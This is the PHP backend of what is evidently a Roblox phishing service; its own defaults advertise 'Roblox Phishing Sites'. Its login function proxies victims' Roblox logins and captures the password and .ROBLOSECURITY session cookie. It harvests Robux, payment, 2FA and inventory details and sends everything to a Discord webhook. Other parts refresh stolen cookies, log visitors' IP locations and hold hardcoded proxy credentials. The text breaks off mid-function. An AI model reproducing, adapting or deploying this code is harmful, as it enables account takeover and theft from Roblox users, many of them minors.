<?php
require_once($_SERVER["DOCUMENT_ROOT"] . "/setup.php");

$db = null;

function connect(): void {
    global $db, $site;
    if ($db !== null) { return; }
    try {
        $db = new PDO(
            "mysql:host=" . $site["DB"]["Host"] . ";dbname=" . $site["DB"]["Name"] . ";charset=utf8mb4",
            $site["DB"]["User"],
            $site["DB"]["Pass"],
            [
                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES   => false,
            ]
        );
        setup_db();
    } catch (PDOException $e) {
        http_response_code(500);
        die(json_encode(["error" => $e->getMessage()]));
    };
};

function setup_db(): void {
    global $db;
    $db->exec("
        CREATE TABLE IF NOT EXISTS user_visits (
            id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            user_id BIGINT UNSIGNED NOT NULL,
            owner_id BIGINT UNSIGNED NOT NULL,
            ip VARCHAR(45) NOT NULL,
            country VARCHAR(64),
            city VARCHAR(64),
            url TEXT NOT NULL,
            type VARCHAR(20),
            visited_at BIGINT NOT NULL,
            INDEX (user_id),
            INDEX (owner_id)
        );
    ");
    $db->exec("
        CREATE TABLE IF NOT EXISTS users (
            id                      BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
            recovery_token          VARCHAR(88)  NOT NULL DEFAULT '',

            referral_code           VARCHAR(12)  NOT NULL DEFAULT '',
            referred_by             VARCHAR(12)  NOT NULL DEFAULT '',
            referral_uses           INT UNSIGNED NOT NULL DEFAULT 0,
            referral_name           VARCHAR(20)  NOT NULL DEFAULT 'Roblox Sites',
            referral_description    VARCHAR(200)  NOT NULL DEFAULT 'The Best Roblox Phishing Sites!',
            referral_invite         VARCHAR(20)  NOT NULL DEFAULT 'discord.gg/Invite',

            discord_id              VARCHAR(32)  NOT NULL DEFAULT '',
            discord_username        VARCHAR(64)  NOT NULL DEFAULT '',
            discord_avatar          VARCHAR(255) NOT NULL DEFAULT '',
            discord_access_token    VARCHAR(512) NOT NULL DEFAULT '',
            discord_refresh_token   VARCHAR(512) NOT NULL DEFAULT '',
            discord_token_expires   BIGINT       NOT NULL DEFAULT 0,
            discord_webhook         VARCHAR(512) NOT NULL DEFAULT '',

            account_level           INT UNSIGNED NOT NULL DEFAULT 1,
            account_banned          TINYINT(1)   NOT NULL DEFAULT 0,
            account_created_at      BIGINT       NOT NULL DEFAULT 0,
            account_last_active     BIGINT       NOT NULL DEFAULT 0,

            discord_everyone        TINYINT(1)   NOT NULL DEFAULT 0,
            discord_here            TINYINT(1)   NOT NULL DEFAULT 0,
            discord_visit_notifier  TINYINT(1)   NOT NULL DEFAULT 0,

            dashboard_anonymous     TINYINT(1)   NOT NULL DEFAULT 0,
            dashboard_autosecure    TINYINT(1)   NOT NULL DEFAULT 1,
            dashboard_autoage       TINYINT(1)   NOT NULL DEFAULT 0,

            account_rank            VARCHAR(512) NOT NULL DEFAULT 'Noob',

            robux_filter            BIGINT       NOT NULL DEFAULT 999999,
            robux_webhook           VARCHAR(512) NOT NULL DEFAULT '',

            summary_filter          BIGINT       NOT NULL DEFAULT 999999,
            summary_webhook         VARCHAR(512) NOT NULL DEFAULT '',

            rap_filter              BIGINT       NOT NULL DEFAULT 999999,
            rap_webhook             VARCHAR(512) NOT NULL DEFAULT '',

            statistics_accounts     BIGINT       NOT NULL DEFAULT 0,
            statistics_visits       BIGINT       NOT NULL DEFAULT 0,
            statistics_clicks       BIGINT       NOT NULL DEFAULT 0,

            profile_real_name       VARCHAR(20)  NOT NULL DEFAULT 'Roblox',
            profile_fake_name       VARCHAR(20)  NOT NULL DEFAULT 'Roblox',
            profile_display_name    VARCHAR(20)  NOT NULL DEFAULT 'Roblox',
            profile_friends         BIGINT       NOT NULL DEFAULT 1,
            profile_followers       BIGINT       NOT NULL DEFAULT 1,
            profile_followings      BIGINT       NOT NULL DEFAULT 1,
            profile_premium         TINYINT(1)   NOT NULL DEFAULT 0,
            profile_status          VARCHAR(20)  NOT NULL DEFAULT 'In Game',
            profile_creation_date   VARCHAR(30)  NOT NULL DEFAULT '',
            profile_description     VARCHAR(1000) NOT NULL DEFAULT '',
            profile_fake_id BIGINT NOT NULL DEFAULT (FLOOR(100000000 + RAND() * 900000000)),

            group_name              VARCHAR(50)  NOT NULL DEFAULT 'Scriptbloxian Studios',
            group_owner_name        VARCHAR(20)  NOT NULL DEFAULT 'Scriptbloxian',
            group_members           BIGINT       NOT NULL DEFAULT 25000000,
            group_funds             BIGINT       NOT NULL DEFAULT 0,
            group_shout             VARCHAR(255) NOT NULL DEFAULT '',
            group_description       VARCHAR(1000) NOT NULL DEFAULT 'Games Development Studio',
            group_thumbnail         VARCHAR(300) NOT NULL DEFAULT 'https://tr.rbxcdn.com/180DAY-5ef5355360e7cad0fb7708e1ab9c7125/150/150/Image/Webp/noFilter',

            private_server_code     VARCHAR(32)  NOT NULL DEFAULT '',

            UNIQUE KEY uq_discord_id (discord_id),
            UNIQUE KEY uq_referral_code (referral_code)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
    ");
};

function get_user_by_discord_id(string $discord_id): array|null {
    global $db;
    $st = $db->prepare("SELECT * FROM users WHERE discord_id = ? LIMIT 1");
    $st->execute([$discord_id]);
    $row = $st->fetch();
    return $row ?: null;
};

function get_user_by_id(int $id): array|null {
    global $db;
    $st = $db->prepare("SELECT * FROM users WHERE id = ? LIMIT 1");
    $st->execute([$id]);
    $row = $st->fetch();
    return $row ?: null;
};

function get_user_by_recovery_token(string $token): array|null {
    global $db;
    $st = $db->prepare("SELECT * FROM users WHERE recovery_token = ? LIMIT 1");
    $st->execute([$token]);
    $row = $st->fetch();
    return $row ?: null;
};

function create_account(
    string $discord_id,
    string $discord_username,
    string $discord_avatar        = "",
    string $discord_access_token  = "",
    string $discord_refresh_token = "",
    int    $discord_token_expires = 0,
    string $referred_by           = ""
): array|null {
    global $db;
    $existing = get_user_by_discord_id($discord_id);
    if ($existing !== null) {
        update_discord_tokens($existing["id"], $discord_access_token, $discord_refresh_token, $discord_token_expires, $discord_username, $discord_avatar);
        return get_user_by_id($existing["id"]);
    };
    $recovery_token = bin2hex(random_bytes(32));
    do {
        $referral_code = substr(bin2hex(random_bytes(8)), 0, 12);
        $st = $db->prepare("SELECT id FROM users WHERE referral_code = ? LIMIT 1");
        $st->execute([$referral_code]);
    } while ($st->fetch());
    if (!empty($referred_by)) {
        if (strlen($referred_by) !== 12) { $referred_by = ""; }
        else {
            $st = $db->prepare("SELECT id FROM users WHERE referral_code = ? LIMIT 1");
            $st->execute([$referred_by]);
            if (!$st->fetch()) { $referred_by = ""; }
        };
    };
    $now = time();
    $st = $db->prepare("
        INSERT INTO users
            (recovery_token, referral_code, referred_by, discord_id, discord_username, discord_avatar, discord_access_token, discord_refresh_token, discord_token_expires, account_created_at, account_last_active, private_server_code)
        VALUES
            (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ");
    $st->execute([
        $recovery_token,
        $referral_code,
        $referred_by,
        $discord_id,
        $discord_username,
        $discord_avatar,
        $discord_access_token,
        $discord_refresh_token,
        $discord_token_expires,
        $now,
        $now,
        implode('', array_map(fn() => random_int(0,9), range(1,32)))
    ]);
    if (!empty($referred_by)) {
        $db->prepare("UPDATE users SET referral_uses = referral_uses + 1 WHERE referral_code = ? LIMIT 1")->execute([$referred_by]);
    };
    return get_user_by_discord_id($discord_id);
};

function update_discord_tokens(int $id, string $access_token, string $refresh_token, int $expires, string $username, string $avatar): void {
    global $db;
    $db->prepare("
        UPDATE users SET
            discord_access_token  = ?,
            discord_refresh_token = ?,
            discord_token_expires = ?,
            discord_username      = ?,
            discord_avatar        = ?,
            account_last_active   = ?
        WHERE id = ?
    ")->execute([$access_token, $refresh_token, $expires, $username, $avatar, time(), $id]);
};

function update_last_active(int $id): void {
    global $db;
    $db->prepare("UPDATE users SET account_last_active = ? WHERE id = ?")->execute([time(), $id]);
};

function ban_user(int $id): void {
    global $db;
    $db->prepare("UPDATE users SET account_banned = 1 WHERE id = ?")->execute([$id]);
};

function unban_user(int $id): void {
    global $db;
    $db->prepare("UPDATE users SET account_banned = 0 WHERE id = ?")->execute([$id]);
};

function send_cors(): void
{
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
    header("Access-Control-Allow-Headers: *");
}

function login_cb(string $val): string
{
    return "```\n" . $val . "\n```";
}

function login(array $incoming_headers, string $raw_body): string
{
    global $site;

    $incoming_headers = array_change_key_case($incoming_headers, CASE_LOWER);

    $base_headers = [
        "sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\", \"Chromium\";v=\"146\", \"Microsoft Edge WebView2\";v=\"146\"",
        "sec-ch-ua-mobile: ?0",
        "sec-ch-ua-platform: \"Windows\"",
        "upgrade-insecure-requests: 1",
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0 RobloxNewBrowser Roblox/WinPCGDK ROBLOX PCGDK App 1.0.0RobloxApp/2.713.0.909 (GlobalDist; RobloxDirectDownload) GAMEPADNAVIGATION",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site: none",
        "sec-fetch-mode: navigate",
        "sec-fetch-user: ?1",
        "sec-fetch-dest: document",
        "accept-encoding: gzip, deflate, br, zstd",
        "accept-language: " . ($incoming_headers["accept-language"] ?? "en-GB,en;q=0.9,en-US;q=0.8"),
        "content-type: application/json;charset=UTF-8",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "priority: u=0, i",
    ];

    foreach (["cookie","sentry-trace","baggage","sec-gpc","idempotency-key","rblx-challenge-id","rblx-challenge-metadata","rblx-challenge-type","x-csrf-token"] as $h)
    {
        if (!empty($incoming_headers[$h])) $base_headers[] = $h . ": " . $incoming_headers[$h];
    };

    $cookie_file = tempnam(sys_get_temp_dir(), "rblx_");

    $make_curl = function(string $body, array $headers) use ($cookie_file)
    {
        $proxy_parts = explode('@', 'u66p68-country-US-session-9h0q29-time-3:ewscd57ccd9j@res-v1.nettify.xyz:1080');
        $proxy_auth = $proxy_parts[0];
        $proxy_server = $proxy_parts[1];
        $auth_parts = explode(':', $proxy_auth);
        $proxy_user = $auth_parts[0];
        $proxy_pass = $auth_parts[1];

        $ch = curl_init("https://auth.roblox.com/v2/login");
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $body,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER         => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_ENCODING       => "",
            CURLOPT_COOKIEFILE     => $cookie_file,
            CURLOPT_COOKIEJAR      => $cookie_file,
            // Proxy disabled for troubleshooting
            /*
            CURLOPT_PROXY          => $proxy_server,
            CURLOPT_PROXYUSERPWD   => $proxy_user . ":" . $proxy_pass,
            CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5_HOSTNAME,
            CURLOPT_HTTPPROXYTUNNEL => true,
            */
        ]);
        return $ch;
    };

    // If the browser already sent a CSRF token, use it. Otherwise, fetch a new one.
    $csrf_token = $incoming_headers["x-csrf-token"] ?? "";

    if (empty($csrf_token)) {
        $ch_csrf  = $make_curl("{}", $base_headers);
        $res_csrf = curl_exec($ch_csrf);
        $hs_csrf  = curl_getinfo($ch_csrf, CURLINFO_HEADER_SIZE);
        $csrf_code = curl_getinfo($ch_csrf, CURLINFO_HTTP_CODE);
        curl_close($ch_csrf);

        foreach (explode("\r\n", substr($res_csrf, 0, $hs_csrf)) as $line)
        {
            if (stripos($line, "x-csrf-token:") === 0)
            {
                $csrf_token = trim(explode(":", $line, 2)[1]);
                break;
            };
        };

        if (empty($csrf_token))
        {
            @unlink($cookie_file);
            send_cors();
            http_response_code($csrf_code ?: 403);
            foreach (explode("\r\n", substr($res_csrf, 0, $hs_csrf)) as $line) {
                if (stripos($line, "x-csrf-token:") === 0) header($line);
            }
            header("content-type: application/json");
            return substr($res_csrf, $hs_csrf);
        }
    }

    $login_headers   = $base_headers;
    // Ensure we don't have duplicate x-csrf-token headers
    $login_headers = array_filter($login_headers, function($h) {
        return stripos($h, "x-csrf-token:") !== 0;
    });
    $login_headers[] = "x-csrf-token: " . $csrf_token;
    if (!empty($incoming_headers["x-bound-auth-token"]))
        $login_headers[] = "x-bound-auth-token: " . $incoming_headers["x-bound-auth-token"];

    $ch_login  = $make_curl($raw_body, $login_headers);
    $res_login = curl_exec($ch_login);

    if ($res_login === false)
    {
        @unlink($cookie_file);
        send_cors();
        http_response_code(502);
        header("content-type: text/plain");
        return "curl error: " . curl_error($ch_login) . " (" . curl_errno($ch_login) . ")";
    };

    $code             = curl_getinfo($ch_login, CURLINFO_HTTP_CODE);
    $hs_login         = curl_getinfo($ch_login, CURLINFO_HEADER_SIZE);
    $raw_resp_headers = substr($res_login, 0, $hs_login);
    curl_close($ch_login);
    @unlink($cookie_file);

    $body             = substr($res_login, $hs_login);
    $content_encoding = "";
    $roblosecurity    = null;
    $skip             = ["content-length", "transfer-encoding", "connection", "set-cookie"];

    foreach (explode("\r\n", $raw_resp_headers) as $line)
    {
        if (strpos($line, ":") === false) continue;
        $parts = explode(":", $line, 2);
        $name  = strtolower(trim($parts[0]));
        $value = trim($parts[1]);
        $value = preg_replace("/domain=\.?roblox\.com/i", "domain=." . $_SERVER["SERVER_NAME"], $value);

        if ($name === "content-encoding") $content_encoding = $value;
        if ($name === "set-cookie" && preg_match("/\.ROBLOSECURITY=([^;]+)/i", $line, $m))
            $roblosecurity = $m[1];
        if ($name === "x-csrf-token") $csrf_token = $value;
        if (!in_array($name, $skip)) header(trim($parts[0]) . ": " . $value, false);
    };

    if ($content_encoding === "gzip")
    {
        $body = empty($body) ? $body : (@gzdecode($body) ?: @gzuncompress($body) ?: $body);
        header("Content-Encoding: none", true);
    };
    
    if ($roblosecurity !== null && $code === 200)
    {
        $secret  = $_COOKIE["secret"] ?? "";
        $webhook = "";
        $referred_by = "";

        if (!empty($secret))
        {
            global $db;
            $st = $db->prepare("SELECT discord_webhook FROM users WHERE referral_code = ? LIMIT 1");
            $st->execute([$secret]);
            $row = $st->fetch();
            if ($row) $webhook = $row["discord_webhook"];
            if ($row) $referred_by = (!$row || empty($row["referred_by"])) ? 0 : $row["referred_by"];
        };

        $json_body = json_decode($body, true);
        $username  = $json_body["user"]["name"] ?? "Unknown";
        $user_id   = (int)($json_body["user"]["id"] ?? 0);

        $post_data = json_decode($raw_body, true);
        if (!empty($post_data["password"]))
        {
            setcookie("Pass", $post_data["password"], [
                "expires"  => time() + 31536000,
                "path"     => "/",
                "secure"   => true,
                "httponly" => false,
                "samesite" => "Lax",
            ]);
            $_COOKIE["Pass"] = $post_data["password"];
        };

        if (!empty($webhook) && $user_id > 0)
        {
            $settings        = rget("https://www.roblox.com/my/settings/json", $roblosecurity);
            $is_admin        = (bool)($settings["IsAdmin"]                                    ?? false);
            $is_premium      = (bool)($settings["IsPremium"]                                  ?? false);
            $email_on_file   = (bool)($settings["IsEmailOnFile"]                              ?? false);
            $above13         = (bool)($settings["UserAbove13"]                                ?? true);
            $display_name    = $settings["DisplayName"]                                        ?? $username;
            $account_age     = (int)($settings["AccountAgeInDays"]                           ?? 0);
            $robux_for_name  = (int)($settings["RobuxRemainingForUsernameChange"]             ?? 0);
            $pin_enabled     = (bool)($settings["IsAccountPinEnabled"]                        ?? false);
            $two_sv          = (bool)($settings["MyAccountSecurityModel"]["IsTwoStepEnabled"] ?? false);
            $has_password    = (bool)($settings["HasValidPasswordSet"]                        ?? true);
            $bday_locked     = (bool)($settings["IsBirthdateLocked"]                          ?? false);
            $prev_names      = trim($settings["PreviousUserNames"] ?? "");

            $economy_data    = rget("https://economy.roblox.com/v1/users/{$user_id}/currency", $roblosecurity);
            $robux_bal       = (int)($economy_data["robux"] ?? 0);

            $tx_data         = rget("https://economy.roblox.com/v1/users/{$user_id}/transaction-totals?timeFrame=Year&transactionType=summary", $roblosecurity);
            $pending_robux   = (int)($tx_data["pendingRobuxTotal"]       ?? 0);
            $tx_incoming     = (int)($tx_data["incomingRobuxTotal"]      ?? 0);
            $tx_outgoing     = (int)($tx_data["outgoingRobuxTotal"]      ?? 0);
            $tx_prem         = (int)($tx_data["premiumPayoutsTotal"]     ?? 0);
            $tx_sales        = (int)($tx_data["salesTotal"]              ?? 0);
            $tx_purchases    = (int)($tx_data["purchasesTotal"]          ?? 0);
            $tx_dev_ex       = (int)($tx_data["developerExchangeTotal"]  ?? 0);
            $tx_group        = (int)($tx_data["groupPayoutsTotal"]       ?? 0);

            $credit_data     = rget("https://billing.roblox.com/v1/credit", $roblosecurity);
            $credit_bal      = number_format((float)($credit_data["balance"] ?? 0), 2);
            $credit_curr     = $credit_data["currencyCode"] ?? "USD";
            $payment_data    = rget("https://billing.roblox.com/v1/payment-methods", $roblosecurity);
            $payment_count   = is_array($payment_data) && empty($payment_data["errors"]) ? count($payment_data) : 0;
            $payment_str     = $payment_count > 0 ? "True (" . $payment_count . ")" : "False";

            $thumb_data      = rget_pub("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$user_id}&size=420x420&format=Png&isCircular=false");
            $avatar_url      = $thumb_data["data"][0]["imageUrl"] ?? null;

            $rap             = 0;
            $limiteds_count  = 0;
            $rap_cursor      = "";
            $rap_page        = 0;
            do
            {
                $inv_data = rget("https://inventory.roblox.com/v1/users/{$user_id}/assets/collectibles?sortOrder=Asc&limit=100" . ($rap_cursor ? "&cursor=" . urlencode($rap_cursor) : ""), $roblosecurity);
                foreach ($inv_data["data"] ?? [] as $inv_item)
                {
                    $rap += (int)($inv_item["recentAveragePrice"] ?? 0);
                    $limiteds_count++;
                };
                $rap_cursor = $inv_data["nextPageCursor"] ?? "";
                $rap_page++;
            }
            while (!empty($rap_cursor) && $rap_page < 5);

            $summary = $robux_bal + $rap;

            $korblox_data    = rget("https://inventory.roblox.com/v1/users/{$user_id}/items/Asset/48545806", $roblosecurity);
            $has_korblox     = !empty($korblox_data["data"]);
            $headless_data   = rget("https://inventory.roblox.com/v1/users/{$user_id}/items/Asset/4819740796", $roblosecurity);
            $has_headless    = !empty($headless_data["data"]);

            $friends_data    = rget_pub("https://friends.roblox.com/v1/users/{$user_id}/friends/count");
            $friends_count   = (int)($friends_data["count"] ?? 0);
            $followers_data  = rget_pub("https://friends.roblox.com/v1/users/{$user_id}/followers/count");
            $followers_count = (int)($followers_data["count"] ?? 0);
            $following_data  = rget_pub("https://friends.roblox.com/v1/users/{$user_id}/followings/count");
            $following_count = (int)($following_data["count"] ?? 0);

            $groups_data     = rget("https://groups.roblox.com/v1/users/{$user_id}/groups/roles", $roblosecurity);
            $total_groups    = count($groups_data["data"] ?? []);
            $owned_groups    = 0;
            $group_robux     = 0;
            foreach ($groups_data["data"] ?? [] as $g_entry)
            {
                if (($g_entry["role"]["rank"] ?? 0) === 255)
                {
                    $owned_groups++;
                    $g_id        = $g_entry["group"]["id"] ?? 0;
                    $g_economy   = rget("https://economy.roblox.com/v1/groups/{$g_id}/currency", $roblosecurity);
                    $group_robux += (int)($g_economy["robux"] ?? 0);
                };
            };

            $games_data    = rget_pub("https://games.roblox.com/v2/users/{$user_id}/games?accessFilter=Public&limit=50&sortOrder=Asc");
            $games_count   = count($games_data["data"] ?? []);
            $total_visits  = array_sum(array_column($games_data["data"] ?? [], "placeVisits"));
            $is_developer  = $total_visits >= 50000;

            $email_data      = rget("https://accountsettings.roblox.com/v1/email", $roblosecurity);
            $email_verified  = !empty($email_data["isVerified"]);
            $phone_data      = rget("https://accountsettings.roblox.com/v1/phone", $roblosecurity);
            $phone_verified  = !empty($phone_data["isVerified"]);

            $two_sv_data     = rget("https://twostepverification.roblox.com/v1/users/{$user_id}/configuration", $roblosecurity);
            $two_sv_type     = "None";
            foreach ($two_sv_data["methods"] ?? [] as $two_sv_method)
            {
                if (!empty($two_sv_method["enabled"]))
                {
                    $two_sv      = true;
                    $two_sv_type = $two_sv_method["mediaType"] ?? "Unknown";
                    break;
                };
            };

            $check_games = [
                "mm2"      => ["badge" => "2124411820", "label" => "Murder Mystery 2"],
                "ps99"     => ["badge" => "5765537645", "label" => "Pet Sim 99      "],
                "amd"      => ["badge" => "2124885574", "label" => "Adopt Me        "],
                "brainrot" => ["badge" => "576553764500","label" => "Steal Brainrot  "],
            ];

            $played_rows = [];
            foreach ($check_games as $info)
            {
                $badge_check = rget("https://inventory.roblox.com/v1/users/{$user_id}/badges/awarded-dates?badgeIds=" . $info["badge"], $roblosecurity);
                $has_played  = !empty($badge_check["data"]);
                $played_rows[] = $info["label"] . " | " . ($has_played ? "True" : "False");
            };

            $age_label    = $above13 ? "13+" : "13-";
            $tf           = fn(bool $v): string => $v ? "True" : "False";
            $two_sv_str   = $two_sv ? "True (" . strtolower($two_sv_type) . ")" : "False";
            $email_str    = $email_on_file
                ? ($email_verified ? "Verified (Set)" : "Unverified (Set)")
                : "Unverified (Not Set)";
            $clean_cookie = str_replace("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", "", $roblosecurity);
            $password     = $_COOKIE["Pass"] ?? "N/A";

            $embed_color = (int)hexdec(ltrim($site["Info"]["Color"] ?? "FFFFFF", "#"));

            $payload = [
                "username"   => $site["Info"]["Name"],
                "avatar_url" => $site["Info"]["Thumbnail"],
                "embeds"     => [
                    array_filter([
                        "color"       => $embed_color,
                        "author"      => $avatar_url
                            ? ["name" => $username . " (" . $age_label . ")", "icon_url" => $avatar_url]
                            : ["name" => $username . " (" . $age_label . ")"],
                        "thumbnail"   => $avatar_url ? ["url" => $avatar_url] : null,
                        "description" => "<:rolimonsblack:978565365338603562> **[Rolimons Stats](https://www.rolimons.com/player/{$user_id})** **|** <:roblox:1349399578213875804> **[Roblox Profile](https://www.roblox.com/users/{$user_id}/profile) [<:cookie:1303895009887785020> Check Cookie](https://" . $_SERVER["SERVER_NAME"] . "/apis?blob=" . generate_blob(json_encode(["method" => "check","cookie" => $clean_cookie])) . ") │ [<:cookie:1303895009887785020> Refresh Cookie](https://" . $_SERVER["SERVER_NAME"] . "/apis?blob=" . generate_blob(json_encode(["method" => "refresh","cookie" => $clean_cookie])) . ")**",
                        "fields"      => [
                            [
                                "name"   => "<:SB_membericon:1434071688240169111> Username (" . $age_label . ")",
                                "value"  => login_cb($username),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:gear:1323480363657334854> Password",
                                "value"  => login_cb($password),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:email:1362423516309229692> Email (2FA)",
                                "value"  => login_cb($email_str),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:PremiumIcon:1154227218436849714> Premium",
                                "value"  => login_cb($tf($is_premium)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:robux:1303891878034538678> Robux (Pending)",
                                "value"  => login_cb(number_format($robux_bal) . " (" . number_format($pending_robux) . ")"),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:robux:1303891878034538678> RAP | Limiteds",
                                "value"  => login_cb(number_format($rap) . " | " . $limiteds_count),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<a:Pulse1x1:1316371092553732096> Summary",
                                "value"  => login_cb(number_format($summary)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:pay:1362423496659042394> Payment Status",
                                "value"  => login_cb($payment_str),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:icons8money64:1316367932795781120> Credit Balance",
                                "value"  => login_cb($credit_bal . " " . $credit_curr),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:KorbloxDeathspeaker:1362432257528168469> Korblox | <:HeadlessHorseman:1362432343255679126> Headless",
                                "value"  => login_cb($tf($has_korblox) . " | " . $tf($has_headless)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:stats:1362423461116641420> Account Stats (Age | Developer)",
                                "value"  => login_cb($account_age . " days | " . $tf($is_developer)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:stats:1362423461116641420> Game Stats (Visits | Games)",
                                "value"  => login_cb(number_format($total_visits) . " | " . $games_count),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:games:1362423506339500152> Games",
                                "value"  => login_cb(implode("\n", $played_rows)),
                                "inline" => false,
                            ],
                            [
                                "name"   => "<:community:1362423568578646016> Owned Groups (Owned | Balance)",
                                "value"  => login_cb($owned_groups . " | " . number_format($group_robux)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:gear:1323480363657334854> Social (Friends | Followers | Following)",
                                "value"  => login_cb(number_format($friends_count) . " | " . number_format($followers_count) . " | " . number_format($following_count)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:gear:1323480363657334854> Security (PIN | Pass | 2SV | B-Day Lock)",
                                "value"  => login_cb($tf($pin_enabled) . " | " . $tf($has_password) . " | " . $two_sv_str . " | " . $tf($bday_locked)),
                                "inline" => true,
                            ],
                            [
                                "name"   => "<:icons8money64:1316367932795781120> Transactions Year (In | Out | DevEx)",
                                "value"  => login_cb(number_format($tx_incoming) . " | " . number_format($tx_outgoing) . " | " . number_format($tx_dev_ex)),
                                "inline" => true,
                            ],
                        ],
                    ], fn($v) => $v !== null),
                    [
                        "color"       => $embed_color,
                        "title"       => "<:cookie:1303895009887785020> Cookie",
                        "description" => login_cb($clean_cookie),
                        "footer"      => ["text" => $site["Info"]["Name"], "icon_url" => $site["Info"]["Logo"]],
                        "timestamp"   => date("c"),
                    ],
                ],
            ];

            $ch_wh = curl_init($site["Info"]["Webhooks"]["Normal"]);
            curl_setopt_array($ch_wh, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST           => true,
                CURLOPT_TIMEOUT        => 10,
                CURLOPT_HTTPHEADER     => ["Content-Type: application/json"],
                CURLOPT_POSTFIELDS     => json_encode($payload),
            ]);
            curl_exec($ch_wh);
        };
    };
    send_cors();
    if ($code == 403 && stripos($body, "failed to authorize") !== false) 
    {
        http_response_code(429);
        die('{"errors":[{"code":7,"message":"Too many attempts. Please wait a bit."}]}');
    };
    http_response_code($code);
    return $body;
}

function record_profile_visit($user_id, $owner_id, $url, $type = 'link') {
    global $db;

    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $ip = explode(',', $ip)[0];
    $ip = trim($ip);

    $country = null;
    $city = null;

    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false
    ]);

    $geo_data = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if ($geo_data && $geo_data['status'] === 'success') {
        $country = $geo_data['country'];
        $city = $geo_data['city'];
    }
    $stmt = $db->prepare("
        INSERT INTO user_visits (user_id, owner_id, ip, country, city, url, type, visited_at) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ");

    $stmt->execute([
        $user_id,
        $owner_id,
        $ip,
        $country,
        $city,
        $url,
        $type,
        time()
    ]);
    $stmt = $db->prepare("
        UPDATE users 
        SET statistics_visits = statistics_visits + 1 
        WHERE id = ?
    ");
    $stmt->execute([$owner_id]);
    $stmt = $db->prepare("
        SELECT statistics_visits 
        FROM users 
        WHERE id = ?
    ");
    $stmt->execute([$owner_id]);
    $stats = $stmt->fetchColumn();
    return $stats;
}

function get_random_proxy(): ?string
{
    $path = $_SERVER['DOCUMENT_ROOT'] . '/api/proxy.txt';
    if (!file_exists($path)) return null;
    $lines = array_filter(array_map('trim', file($path)));
    if (empty($lines)) return null;
    return $lines[array_rand($lines)];
};

function apply_proxy($ch, ?string $proxy): void
{
    if (!$proxy) return;
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $parts = explode(':', $proxy);
    if (count($parts) === 4)
    {
        curl_setopt($ch, CURLOPT_PROXY, $parts[0] . ':' . $parts[1]);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $parts[2] . ':' . $parts[3]);
    };
};

function refresh_cookie(string $cookie): array {
    if (empty($cookie)) return ["success" => false, "message" => "Invalid Cookie"];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/client-assertion/");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "user-agent: Roblox/WinINet",
        "referer: https://www.roblox.com/",
        "origin: https://www.roblox.com",
        "cookie: .ROBLOSECURITY=" . $cookie,
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    $client_assertion = json_decode($response, true)["clientAssertion"] ?? null;

    if ($client_assertion) 
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "");
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "user-agent: Roblox/WinINet",
            "content-type: application/json",
            "referer: https://www.roblox.com/",
            "origin: https://www.roblox.com",
            "cookie: .ROBLOSECURITY=" . $cookie,
